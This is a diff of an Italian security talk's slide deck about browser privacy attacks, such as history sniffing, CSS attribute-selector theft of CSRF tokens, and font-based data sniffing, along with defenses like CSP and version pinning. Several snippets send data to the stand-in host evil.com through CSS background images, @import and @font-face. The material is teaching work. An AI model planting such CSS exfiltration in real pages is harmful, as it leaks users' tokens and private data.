@@ -72,15 +72,15 @@
 </p-slide>
 <p-slide>
   <h3 class="our-header">~2000</h3>
-  <div class="two-columns">
+  <div class="two-columns align-center">
     <div>
       <a href="//nowhere.really">F.C. Barcelona</a><br>
       <a href=".">Real Madrid C.F.</a><br>
     </div>
     <p-fragment class="big-x-wrapper">
       <pre class="language-js"><code>function isVisited(a) {
-  return getComputedStyle(a).color
-    === 'rgb(85, 26, 139)';
+  return getComputedStyle(a)
+    .color === 'rgb(85, 26, 139)'
 }</code></pre>
       <p-fragment class="big-x"></p-fragment>
     </p-fragment>
@@ -88,7 +88,7 @@
   <p-notes>Non funziona più perché <code>getComputedStyle</code> ora restituisce sempre lo stile del link non visitato</p-notes>
 </p-slide>
 <p-slide>
-  <h3 class="our-header">2013</h3>
+  <h3 class="our-header">~2010</h3>
   <div class="two-columns">
     <div>
       <pre class="language-css"><code>a:visited {
@@ -103,9 +103,9 @@
       <pre class="language-js"><code>function isVisited(a) {
   return new Promise(resolve => {
     const start = Date.now();
-    requestAnimationFrame(now => {
-      resolve(now - start > 17);
-    });
+    requestAnimationFrame(now =>
+      resolve(now - start > 17)
+    );
   });
 }</code></pre>
     </p-fragment>
@@ -164,10 +164,9 @@
   <div class="two-columns">
     <pre class="language-html"><code>&lt;a href="...">
   &lt;svg>
-    &lt;filter id="fx">
-      ...
-    &lt;/filter>
-    &lt;path filter="url(#fx)" d="..."/>
+    &lt;filter id="fx">...&lt;/filter>
+    &lt;path filter="url(#fx)"
+          d="..."/>
   &lt;/svg>
 &lt;/a></code></pre>
     <div class="center">
@@ -264,7 +263,7 @@
         <div class="on"></div>
         <div class="on"></div>
       </div>
-      <p>Inserire il numero sopra:</p>
+      <p>Inserire il numero:</p>
       <div style="border: .05em solid; padding: .25em">|</div>
     </div>
   </div>
@@ -703,17 +702,6 @@ input[name="csrf"][value$="="] ~ * {
   </div>
 </p-slide>
 <p-slide>
-  <h4 class="our-header">Hidden input per ultimi? No problem!</h4>
-  <pre class="language-css self-center"><code>form:has(input[name="csrf"][value^="a"]) {
-  background-image: url('http://evil.com/a.gif');
-}
-...
-form:has(input[name="csrf"][value$="="]) {
-  background-image: url('http://evil.com/is-base-64.gif');
-}
-...</code></pre>
-</p-slide>
-<p-slide>
   <h4 class="center">Sono solo un paio di byte&hellip; 🤷‍♀️</h4>
   <p-fragment>
     <h2 class="center">&hellip; oppure no? 😨</h2>
@@ -731,7 +719,6 @@ form:has(input[name="csrf"][value$="="]) {
 @import url(//evil.com/exfil?l=7);
 @import url(//evil.com/exfil?l=8);
 @import url(//evil.com/exfil?l=9);
-@import url(//evil.com/exfil?l=10);
 ...</code></pre>
     <p-fragment><video src="img/exfil.webm" alt="Clip di un log di rete durante esfiltrazione di dati" style="width: 100%;" autoplay loop muted></p-fragment>
   </div>
@@ -752,7 +739,7 @@ form:has(input[name="csrf"][value$="="]) {
       </div>
     </div>
     <p-fragment index="1">
-      <pre class="language-css"><code>#balance {
+      <pre class="language-css"><code>#bal {
   font-family: EvilSniff;
 }</code></pre>
     </p-fragment>
@@ -760,13 +747,13 @@ form:has(input[name="csrf"][value$="="]) {
       <pre class="language-html"><code>&lt;p>Salve, &lt;b>Mario Rossi&lt;/b>&lt;/p>
 &lt;div class="info">
   &lt;span>Saldo &euro;&lt;/span>
-  &lt;span id="balance">1.234,50&lt;/span>
+  &lt;span id="bal">1.234,50&lt;/span>
 &lt;/div></code></pre>
     </p-fragment>
     <p-fragment index="2">
       <pre class="language-css"><code>@font-face {
   font-family: EvilSniff;
-  src: url(http://evil.com/0.woff)
+  src: url(http://evil.com/0.wof)
        format('woff');
   unicode-range: U+0040;
 }</code></pre>
@@ -790,7 +777,7 @@ form:has(input[name="csrf"][value$="="]) {
   <pre class="language-css self-center" style="width: 80%;"><code>@font-face {
   font-family: 'Material Icons';
   src: local('Material Icons'),
-    url(https://gfonts.com/MaterialIcons.woff) format('woff');
+    url(//gfonts.com/MaterialIcons.woff) format('woff');
 }</code></pre>
   <div class="two-columns align-center self-center" style="width: 80%;">
     <p-fragment>
@@ -833,8 +820,8 @@ form:has(input[name="csrf"][value$="="]) {
   <div class="two-columns">
     <p-fragment class="big-x-wrapper">
       <pre class="language-html"><code>&lt;script>document
-  .querySelector('input[name=csrf]')
-  .value = "1234abcd";
+.querySelector('input[name=csrf]')
+.value = "1234abcd";
 &lt;/script></code></pre>
       <p-fragment class="big-x" index="1"></p-fragment>
     </p-fragment>
@@ -859,13 +846,13 @@ form:has(input[name="csrf"][value$="="]) {
   </div>
   <p-fragment class="encapsulated-css">
     <div style="width: 33%;">
-      <code>main-header</code>
+      <code>my-header</code>
     </div>
     <div style="width: 34%;">
-      <code>main-content</code>
+      <code>my-content</code>
     </div>
     <div style="width: 33%;">
-      <code>main-footer</code>
+      <code>my-footer</code>
     </div>
   </p-fragment>
   <p-fragment class="encapsulated-css">
@@ -941,7 +928,7 @@ form:has(input[name="csrf"][value$="="]) {
   }
 Content-Security-Policy: default-src 'self'; report-to csp-endpoint</code></pre>
   <p-fragment>
-    <pre class="language-js"><code>Content-Security-Policy: default-src 'self'; report-uri https://test.com/csp</code></pre>
+    <pre class="language-js"><code>Content-Security-Policy: default-src 'self'; report-uri //test.com/csp</code></pre>
   </p-fragment>
 </p-slide>
 <p-slide class="center">
@@ -953,13 +940,13 @@ Content-Security-Policy: default-src 'self'; report-to csp-endpoint</code></pre>
 <p-slide>
   <h3 class="center">Version pinning</h3>
   <p-fragment class="big-x-wrapper">
-    <pre class="language-html"><code>&lt;link rel="stylesheet" src="https://cdn.com/bootstrap/latest/bootstrap.min.css">
-&lt;script src="https://cdn.com/jquery/latest/jquery.min.js">&lt;/script></code></pre>
+    <pre class="language-html"><code>&lt;link rel="stylesheet" src="https://cdn.com/bootstrap/latest/bs.min.css">
+&lt;script src="https://cdn.com/jquery/latest/$.min.js">&lt;/script></code></pre>
     <p-fragment class="big-x"></p-fragment>
   </p-fragment>
   <p-fragment>
-    <pre class="language-html"><code>&lt;link rel="stylesheet" src="https://cdn.com/bootstrap/4.6.1/bootstrap.min.css">
-&lt;script src="https://cdn.com/jquery/3.6.0/jquery.min.js">&lt;/script></code></pre>
+    <pre class="language-html"><code>&lt;link rel="stylesheet" src="https://cdn.com/bootstrap/4.6.1/bs.min.css">
+&lt;script src="https://cdn.com/jquery/3.6.0/$.min.js">&lt;/script></code></pre>
   </p-fragment>
 </p-slide>
 <p-slide>
